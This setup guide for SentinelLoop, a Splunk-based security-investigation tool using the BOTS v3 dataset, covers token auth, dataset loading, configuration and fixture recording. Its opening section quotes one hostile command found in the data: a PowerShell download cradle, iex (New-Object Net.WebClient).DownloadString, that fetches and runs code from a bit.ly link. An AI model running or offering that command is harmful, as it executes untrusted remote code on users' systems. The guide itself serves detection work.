# Going Live: Splunk + BOTS v3

DEMO mode needs none of this. Follow it only to run SentinelLoop against a real Splunk
and to re-record the demo fixtures from authentic data.

> **✅ Verified on the dev environment (host `jr`).** Token auth works against
> `https://127.0.0.1:8089`; `index=botsv3` holds ~1.94M events. There is **no Enterprise
> Security / `notable` index**, so SentinelLoop derives the alert queue from curated
> detections over `botsv3` (see `LiveSplunk._DETECTIONS`). The hero finding is a **real
> encoded-PowerShell download cradle** in `wineventlog:security` EventCode=4688 (hosts
> ABUNGST-L / FYODOR-L) — `powershell.exe -enc <base64>` decoding to
> `iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")`. The live
> schema-drift demo is honest: a query filtering on `process_name` (absent on this
> sourcetype) returns 0 rows, and the agent heals to `New_Process_Name`.

## 1. Get a Splunk you can query
Pick one:
- **Splunk Cloud free trial** — sign up, note your stack URL. Cloud REST/management may
  need the API enabled and an IP allowlist entry for your machine.
- **Splunk Enterprise (free, local)** — download, install, runs on `https://localhost:8089`
  for the management/REST port (the web UI is `:8000`; we use the REST port).

## 2. Create an auth token
Splunk Web → **Settings → Tokens** → enable token auth → **New Token** (set audience +
expiry). Copy it once. (Or use a username/password — less ideal.)

## 3. Load the BOTS v3 dataset (realistic security data)
1. Download **Boss of the SOC v3** dataset (Splunk's public security dataset).
2. In Splunk Web → **Settings → Indexes** → create index `botsv3`.
3. Add the data (upload the dataset / point an input at it) into `botsv3`.
4. Sanity check in Search: `index=botsv3 | stats count by sourcetype` returns rows.

## 4. Point SentinelLoop at it
```bash
cp .env.example .env
```
Set:
```
SENTINEL_MODE=LIVE
SPLUNK_HOST=<your-host>          # e.g. localhost or your cloud stack host
SPLUNK_PORT=8089
SPLUNK_TOKEN=<your-token>
SPLUNK_VERIFY_SSL=false          # true once you have valid certs
# optional, for AI-generated SPL plans + healing:
ANTHROPIC_API_KEY=<key>
```

## 5. Verify one REST call works, then record fixtures
The single most important checkpoint (your "one search returns JSON"):
```bash
python -c "from app.core.config import load_config; from app.splunk.client import LiveSplunk; \
c=load_config(); s=LiveSplunk(c.splunk_host,c.splunk_port,c.splunk_token,c.splunk_username,c.splunk_password,c.splunk_verify_ssl); \
print(s.run_spl('| makeresults | eval ok=1')[:2])"
```
If that prints a row, you're connected. Optionally record fixtures from **verified** BOTS v3
searches (these are the exact field-extracted sourcetypes confirmed on this dataset):
```bash
python tools/record_fixtures.py alerts
python tools/record_fixtures.py search 'index=botsv3 sourcetype=wineventlog:security EventCode=4688 host=ABUNGST-L (New_Process_Name=*powershell* OR Process_Command_Line=*powershell*) | table _time, Creator_Process_Name, New_Process_Name, Process_Command_Line, Account_Name' search_process.json
python tools/record_fixtures.py search 'index=botsv3 sourcetype=wineventlog:security EventCode=4688 host=ABUNGST-L | stats count by New_Process_Name | sort -count | head 12' search_network.json
python tools/record_fixtures.py search 'index=botsv3 sourcetype=wineventlog:security EventCode=4624 host=ABUNGST-L | stats count by Account_Name | sort -count | head 8' search_auth.json
```
Note: LIVE mode already runs these against `botsv3` directly via `BotsV3Planner` — recording
fixtures is only for keeping DEMO mode network-proof during the live pitch.

## 6. Run
```bash
python run.py
```
LIVE mode now executes real SPL; with an `ANTHROPIC_API_KEY` set, `LLMPlanner` generates
the investigation plan and heals broken SPL via Claude.

## Demo safety
Re-recorded fixtures keep DEMO mode authentic **and** network-proof. Record once against
real Splunk, commit the fixtures, then demo in DEMO mode so conference wifi can never
break your run.
